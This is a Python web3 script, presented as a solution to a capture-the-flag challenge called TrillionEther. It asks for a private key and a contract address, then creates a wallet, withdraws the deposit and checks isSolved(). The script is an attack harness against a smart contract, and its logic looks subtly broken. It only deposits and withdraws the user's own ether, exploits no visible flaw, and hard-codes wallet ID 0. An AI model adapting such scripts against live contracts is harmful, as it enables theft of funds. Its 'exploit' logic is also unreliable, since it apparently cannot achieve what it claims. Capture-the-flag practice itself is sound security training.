
import sys
import time
from web3 import Web3
from eth_account import Account
from getpass import getpass
from http.client import RemoteDisconnected

def main():
    try:
        print("=== TrillionEther CTF Exploit Script ===\n")

        # Accept user inputs dynamically
        rpc_endpoint = input("Enter the RPC endpoint URL: ").strip()
        private_key = getpass("Enter your private key (input hidden): ").strip()
        your_address = input("Enter your Ethereum address: ").strip()
        challenge_contract_address = input("Enter the challenge contract address: ").strip()

        # Initialize Web3
        web3 = Web3(Web3.HTTPProvider(rpc_endpoint))
        if not web3.is_connected():
            print("Failed to connect to the RPC endpoint.")
            sys.exit(1)
        print("Connected to RPC endpoint.")

        # Set up account
        try:
            account = Account.from_key(private_key)
        except Exception as e:
            print(f"Invalid private key: {e}")
            sys.exit(1)

        if account.address.lower() != your_address.lower():
            print("The provided private key does not match the provided address.")
            sys.exit(1)
        print(f"Using account: {account.address}")

        # Define the contract ABI (simplified for brevity)
         # Define the contract ABI
        contract_abi = [
            {
                "inputs": [],
                "stateMutability": "payable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "isSolved",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    }
                ],
                "name": "createWallet",
                "outputs": [],
                "stateMutability": "payable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "fromWalletId",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "toWalletId",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "transfer",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "walletId",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "withdraw",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    },
                    {
                        "internalType": "uint256",
                        "name": "balance",
                        "type": "uint256"
                    },
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    }
                ],
                "name": "_newWallet",
                "outputs": [
                    {
                        "internalType": "struct TrillionEther.Wallet",
                        "name": "wallet",
                        "type": "tuple",
                        "components": [
                            {
                                "internalType": "bytes32",
                                "name": "name",
                                "type": "bytes32"
                            },
                            {
                                "internalType": "uint256",
                                "name": "balance",
                                "type": "uint256"
                            },
                            {
                                "internalType": "address",
                                "name": "owner",
                                "type": "address"
                            }
                        ]
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "name": "wallets",
                "outputs": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    },
                    {
                        "internalType": "uint256",
                        "name": "balance",
                        "type": "uint256"
                    },
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            }
        ]  # Use the ABI as previously defined

        # Initialize contract instance
        try:
            contract = web3.eth.contract(address=web3.to_checksum_address(challenge_contract_address), abi=contract_abi)
        except Exception as e:
            print(f"Error initializing contract: {e}")
            sys.exit(1)
        print("Contract instance created.")

        # Helper function to build and send transactions with retries
        def send_transaction(func, *args, value=0, gas=300000, gas_price_gwei=1, retries=3, delay=5):
            attempt = 0
            while attempt < retries:
                try:
                    nonce = web3.eth.get_transaction_count(account.address)
                    tx = func(*args).build_transaction({
                        'from': account.address,
                        'nonce': nonce,
                        'gas': gas,
                        'gasPrice': web3.to_wei(gas_price_gwei, 'gwei'),
                        'value': web3.to_wei(value, 'ether')
                    })
                    signed_tx = web3.eth.account.sign_transaction(tx, private_key=private_key)
                    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
                    print(f"Transaction sent: {tx_hash.hex()}")
                    receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
                    print(f"Transaction mined in block {receipt.blockNumber}.")
                    return receipt
                except RemoteDisconnected as e:
                    attempt += 1
                    print(f"RemoteDisconnected Error: {e}. Retry {attempt}/{retries} after {delay} seconds.")
                    time.sleep(delay)
                except Exception as e:
                    print(f"Error during transaction: {e}")
                    print("Retrying...")
                    attempt += 1
                    time.sleep(delay)
            print("Failed to send transaction after multiple attempts.")
            sys.exit(1)

        # Function to create a new wallet with deposit
        def create_wallet_with_deposit(name, deposit_amount):
            print(f"\nCreating wallet '{name}' with {deposit_amount} ether.")
            name_bytes = web3.to_bytes(text=name)
            if len(name_bytes) > 32:
                name_bytes = name_bytes[:32]
            elif len(name_bytes) < 32:
                name_bytes = name_bytes.ljust(32, b'\0')
            try:
                send_transaction(contract.functions.createWallet, name_bytes, value=deposit_amount)
                print(f"Wallet '{name}' created successfully.")
            except Exception as e:
                print(f"Error creating wallet '{name}': {e}")
                sys.exit(1)

        # Function to withdraw funds from a wallet
        def withdraw_funds(wallet_id, amount):
            print(f"\nWithdrawing {amount} ether from wallet ID {wallet_id}.")
            try:
                send_transaction(contract.functions.withdraw, wallet_id, web3.to_wei(amount, 'ether'))
                print(f"Withdrawal from wallet ID {wallet_id} successful.")
            except Exception as e:
                print(f"Error withdrawing from wallet ID {wallet_id}: {e}")
                sys.exit(1)

        # Function to get contract's current balance in ether
        def get_contract_balance():
            balance_wei = web3.eth.get_balance(contract.address)
            balance_eth = web3.from_wei(balance_wei, 'ether')
            print(f"Current contract balance: {balance_eth} ETH")
            return balance_eth

        # Function to get wallet's balance
        def get_wallet_balance(wallet_id):
            try:
                wallet = contract.functions.wallets(wallet_id).call()
                balance_eth = web3.from_wei(wallet[1], 'ether')
                print(f"Wallet ID {wallet_id} balance: {balance_eth} ETH")
                return balance_eth
            except Exception as e:
                print(f"Error fetching wallet ID {wallet_id}: {e}")
                sys.exit(1)

        # Function to display all wallets' balances
        def display_all_wallet_balances(num_wallets):
            print("\n--- Wallet Balances ---")
            for i in range(num_wallets):
                get_wallet_balance(i)
            print("-----------------------\n")

        # Function to check and display account balance
        def get_account_balance():
            balance_wei = web3.eth.get_balance(account.address)
            balance_eth = web3.from_wei(balance_wei, 'ether')
            print(f"Your account balance: {balance_eth} ETH")
            return balance_eth

        # Exploit Logic
        print("\n=== Starting Exploit ===")

        # Step 1: Check your account balance
        print("\n--- Step 1: Check Account Balance ---")
        account_balance = get_account_balance()
        if account_balance < 1.0:
            print("Insufficient funds in your account to proceed with the exploit.")
            print("Please ensure your account has at least 1 ETH to cover deposits and gas fees.")
            sys.exit(1)

        # Step 2: Check contract's balance
        print("\n--- Step 2: Check Contract's Balance ---")
        contract_balance = get_contract_balance()
        if contract_balance < 1.0:
            print("Contract's balance is less than 1 ETH. Adjusting deposit amount accordingly.")
            deposit_amount = contract_balance
        else:
            # Calculate a safe deposit amount (e.g., 90% of account balance)
            # Estimate gas cost (let's assume ~0.001 ETH for simplicity)
            estimated_gas_fee = 0.001
            deposit_amount = account_balance - estimated_gas_fee
            print(f"Calculated deposit amount: {deposit_amount} ETH")

        # Step 3: Create a wallet with the deposit amount
        print("\n--- Step 3: Create a Wallet with Deposit ---")
        wallet_name = "ExploitWallet"
        create_wallet_with_deposit(wallet_name, deposit_amount)

        # Small delay to ensure wallet creation
        time.sleep(2)

        # Step 4: Display wallet balances to verify
        display_all_wallet_balances(1)  # Assuming wallet ID 0

        # Step 5: Withdraw the deposited amount
        print(f"\n--- Step 5: Withdrawing {deposit_amount} ether from wallet ID 0 ---")
        withdraw_funds(0, deposit_amount)

        # Small delay
        time.sleep(2)

        # Step 6: Display wallet balances after withdrawal
        display_all_wallet_balances(1)

        # Step 7: Verify if the contract is solved
        print("\n--- Step 7: Checking if the contract is solved ---")
        try:
            is_solved = contract.functions.isSolved().call()
            if is_solved:
                print("Exploit successful! isSolved() is now True.")
            else:
                print("Exploit failed. isSolved() is still False.")
        except Exception as e:
            print(f"Error checking isSolved: {e}")
            sys.exit(1)

    except KeyboardInterrupt:
        print("\nScript terminated by user.")
        sys.exit(0)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()

